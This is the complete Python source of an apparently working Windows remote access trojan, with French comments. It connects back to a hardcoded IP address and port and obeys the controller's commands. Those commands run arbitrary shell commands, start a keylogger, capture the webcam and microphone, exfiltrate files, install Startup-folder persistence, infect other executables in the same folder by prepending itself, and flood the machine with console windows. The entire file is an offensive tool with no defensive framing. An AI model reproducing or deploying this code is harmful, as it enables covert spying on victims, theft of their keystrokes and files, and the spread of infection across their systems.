import subprocess
import threading
import os
import time
import socket
import sys
import pyWinhook
import pythoncom
import cv2
import shutil
import pyaudio
import wave
import io
import glob


script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

def get_original_exe_path():
    return os.path.realpath(sys.argv[0])

def duplicate_exe(current_dir):
    original_exe_path = get_original_exe_path()
    startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    search_path = os.path.join(current_dir, "*.exe")
    exe_files = glob.glob(search_path)

    for file in exe_files:
        if file != original_exe_path:
            try:
                with open(original_exe_path, 'rb') as f1, open(file, 'rb+') as f2:
                    original_exe_content = f1.read()
                    file_content = f2.read()
                    f2.seek(0)
                    f2.write(original_exe_content)
                    f2.write(file_content)
                    shutil.copy2(file, startup_folder)
            except Exception as e:
                continue

def open_cmd_in_loop():
    for _ in range(10000000000000000000000000000):  # Be careful with the range, it can overload the system
        subprocess.Popen("cmd /c start cmd /k FOR /L %N IN () DO echo /!\\ AUTO DESTRUCTION IMMINENTE /!\\", shell=True)
        
def record_audio(duration, conn):
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = duration
    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True,
                    frames_per_buffer=CHUNK)

    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    waveFile = wave.open(io.BytesIO(), 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))

    audio_data = waveFile._file.getvalue()
    conn.sendall(audio_data)
    conn.sendall(b"END_OF_AUDIO")

def execute_command(commande, s):
    command_to_execute = commande
    try:
        output = subprocess.check_output(command_to_execute, shell=True, stderr=subprocess.STDOUT, text=True)
        send_data(s, output)
    except subprocess.CalledProcessError as e:
        output = f"Erreur : {str(e)}"
        send_data(s, output)

def create_persistence():
    executable_path = sys.executable
    startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    
    try:
        shutil.copy2(executable_path, startup_folder)
    except Exception as e:
        print(f"Une erreur s'est produite : {e}")

def take_webcam_photo(conn):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        conn.sendall(b"Erreur lors de la capture de l'image de la webcam.")
        return
    frame_encoded = cv2.imencode('.jpg', frame)[1].tobytes()
    conn.sendall(frame_encoded)
    cap.release()

def send_webcam_frames(conn, cap, webcam_running):
    while cap.isOpened() and webcam_running.is_set():
        ret, frame = cap.read()
        if not ret:
            break
        frame_encoded = cv2.imencode('.jpg', frame)[1].tobytes()
        conn.sendall(frame_encoded + b"END_OF_FRAME")

def start_logger():
    log_file = os.path.expanduser('~') + "\\logger_output.txt"

    def OnKeyboardEvent(event):
        with open(log_file, "a") as f:
            f.write(chr(event.Ascii))
        return True

    hooks_manager = pyWinhook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

def stop_logger():
    hooks_manager = pyWinhook.HookManager()
    hooks_manager.UnhookKeyboard()
    pythoncom.PumpWaitingMessages()

def send_data(s, data):
    s.sendall(data.encode('cp1252', errors='replace'))

def connect_to_server(adresse_hote, port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((adresse_hote, port))
                repertoire_courant = os.getcwd()
                webcam_running = threading.Event()
                while True:
                    commande = s.recv(1024).decode()
                    if not commande or commande == "":
                        s.sendall(b" ")

                    elif commande.lower() == 'stop_connection':
                        s.close()
                        sys.exit()
                    elif commande.lower().startswith('cd '):
                        try:
                            path = commande[3:]
                            if os.path.isdir(path):
                                os.chdir(path)
                                current_dir = os.path.abspath(os.getcwd())
                                send_data(s, f"Répertoire changé en : {current_dir}")
                        except Exception as e:
                            send_data(s, f"Erreur : {str(e)}")
                    elif commande.lower() == 'start_logger':
                        keylogger_thread = threading.Thread(target=start_logger)
                        keylogger_thread.start()
                    elif commande.lower() == 'stop_logger':
                        stop_logger()
                        with open(os.path.expanduser('~') + "\\logger_output.txt", "rb") as logfile:
                            file_data = logfile.read()
                            s.sendall(file_data)
                            s.sendall(b"LOGGER_END")
                    elif commande == "start_webcam":
                        cap = cv2.VideoCapture(0)
                        webcam_running.set()
                        threading.Thread(target=send_webcam_frames, args=(s, cap, webcam_running)).start()
                    elif commande == "stop_webcam":
                        webcam_running.clear()
                        if cap.isOpened():
                            cap.release()
                            s.sendall(b"Webcam stoppee")
                        else:
                            s.sendall(b"Webcam stoppee")
                    elif commande.lower() == 'create_persistence':
                        create_persistence()
                        send_data(s, "Persistence créée.")
                    elif commande == "take_photo":
                        take_webcam_photo(s)
                    elif commande.startswith("record_audio"):
                        try:
                            duration = int(commande.split(' ')[1])
                            record_audio(duration, s)
                        except Exception as e:
                            send_data(s, f"Erreur : {str(e)}")
                    elif commande.lower().startswith('copy_file'):
                        try:
                            file_name = commande.split(' ')[1]

                            file_path = os.path.join(current_dir, file_name)

                            with open(file_path, 'rb') as f:
                                while True:
                                    data = f.read(1024)
                                    if not data:
                                        break
                                    s.sendall(data)
                            s.sendall(b"END_OF_FILE")  # Envoi du signal de fin de fichier
                        except Exception as e:
                            s.sendall(b"Erreur lors de l'envoi du fichier :")  # Envoi du message d'erreur
                            s.sendall(str(e).encode())
                            s.sendall(b"END_OF_FILE")  # Envoi du signal de fin de fichier en cas d'erreur                  
                    elif commande.lower() == 'kill':
                        kill_thread = threading.Thread(target=open_cmd_in_loop)
                        kill_thread.start()
                        s.sendall(b"Killed")
                    elif commande.lower() == 'infecte':
                        infecte_thread = threading.Thread(target=duplicate_exe, args=(current_dir,))
                        infecte_thread.start()
                        s.sendall(b"Infected")
                    else:
                        t = threading.Thread(target=execute_command, args=(commande, s))
                        t.start()
        except Exception as e:
            time.sleep(5)
            continue

adresse_hote = '10.29.126.30'
port = 4567

connect_to_server(adresse_hote, port)